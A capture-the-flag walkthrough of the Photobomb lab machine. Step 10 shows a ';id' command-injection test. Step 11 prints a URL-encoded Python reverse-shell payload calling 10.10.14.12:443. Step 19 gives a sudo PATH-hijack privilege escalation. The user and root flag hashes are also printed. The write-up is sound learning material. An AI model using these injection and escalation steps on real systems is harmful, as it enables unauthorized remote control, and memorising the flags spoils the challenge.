# Photobomb
> Write-up author: jon-brandy
## DESCRIPTION:
- NONE
## HINT:
- NONE
## STEPS:
1. First, let's check all open ports and it's services from the host given.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/211187399-28b9242d-ad0b-4fb0-a255-eb0e7fe46ab4.png)


2. Based from the output, it seems the machine is running a web application.
3. So let's open the webapp.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/211187862-a8c8ee89-b456-4a0f-b1e8-43125353176c.png)


4. Let's click this:

![image](https://user-images.githubusercontent.com/70703371/211187884-27fe79c0-97d4-49d5-a55e-2db4a2b69d93.png)


> RESULT

![image](https://user-images.githubusercontent.com/70703371/211187889-bde4bf7a-a15d-48ae-b340-7de1102c675f.png)


5. Well we don't have any creds, let's check the page source.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/211187961-98e9ad44-061e-4e4a-8178-48a0d3539c74.png)


6. Let's check the `.js` file.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/211187975-b432a7ef-7a85-4c03-b159-f511c4b6ec43.png)


![image](https://user-images.githubusercontent.com/70703371/211187993-b6eb2ef8-7633-4800-b00e-3154f28bb366.png)



7. Got a hint there, open the link then.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/211188002-03f41d74-a975-4068-b9de-a3ac4f030445.png)


![image](https://user-images.githubusercontent.com/70703371/211188016-93639302-051f-45b5-a030-7d96ee78947e.png)


8. It seems we can download any image we click here.

![image](https://user-images.githubusercontent.com/70703371/211188145-a76d347c-4916-4e46-8bbb-cf96c3c260ea.png)


9. Hence, let's see the download request using burpsuite and send it to repeater.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/211188308-051c41d0-21c5-47e5-bb41-52437ead0a37.png)


10. To check whether it's vulnerable to command injection, let's add `;id` behind the value of filetype parameter.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/211188356-5eefb301-754f-4bc2-8dd4-e80620f0bf76.png)


![image](https://user-images.githubusercontent.com/70703371/211241745-356fd100-fcb1-4ea2-891d-f6f6d8c43e81.png)


11. Now let's try to inject command for reverse shell. I used this command from `hacktools`.

```
python3%20-c%20'import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.14.12%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22/bin/bash%22)'
```

12. Now set a listeners for port 443. Then paste the payload behind the `jpg;`, next click send.

![image](https://user-images.githubusercontent.com/70703371/211243510-3cb7e988-161f-4f81-8184-24d7d9842058.png)


![image](https://user-images.githubusercontent.com/70703371/211243792-e296f709-2bd1-4743-881d-213ad1ec7305.png)


![image](https://user-images.githubusercontent.com/70703371/211244032-3223424d-4582-450a-ad40-524540bad572.png)


13. Now press `ctrl-d`.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/211244049-24cc8e99-cc1c-4404-bccf-8f42ea07a278.png)


14. Let's find all the flags!


![image](https://user-images.githubusercontent.com/70703371/211244076-a9c1028b-ae19-4ad9-a1ac-b8dc7b34db11.png)


![image](https://user-images.githubusercontent.com/70703371/211244143-9a6c5ae9-9237-4c8f-9811-b55915f99cba.png)


15. Got the user flag!

## USER FLAG


```
e89b54a9041e03ea2ea5148f38d1413d
```

16. Then go for the root now.

![image](https://user-images.githubusercontent.com/70703371/211244239-4fe105cb-6da1-4f5d-bb8e-eb29d0ca6cfa.png)


17. Since we're not root, gotta find a way.
18. Find a bash script at the `opt` directory.

![image](https://user-images.githubusercontent.com/70703371/211244351-2be543e5-599f-4d60-a6c8-4e94345b2a22.png)


19. Actually i'm stucked here, so i did a small outsource about this challenge and found out that we have to run this command in order to get the root mode:

```
sudo -l # check our available command
echo bash > find
chmod +x find
sudo PATH=$PWD:$PATH /opt/cleanup.sh
```

> RESULT

![image](https://user-images.githubusercontent.com/70703371/211244753-c2b12678-a38d-4095-814d-7233d2824785.png)


![image](https://user-images.githubusercontent.com/70703371/211275027-a030bb8e-fe63-423f-8feb-fcf6428107a2.png)


![image](https://user-images.githubusercontent.com/70703371/211275088-aa48c39a-5569-4527-a8a7-5f36333ccd54.png)


20. Got the root flag!


## ROOT FLAG

```
09472dbb86cfe57789293cef8965aa07
```




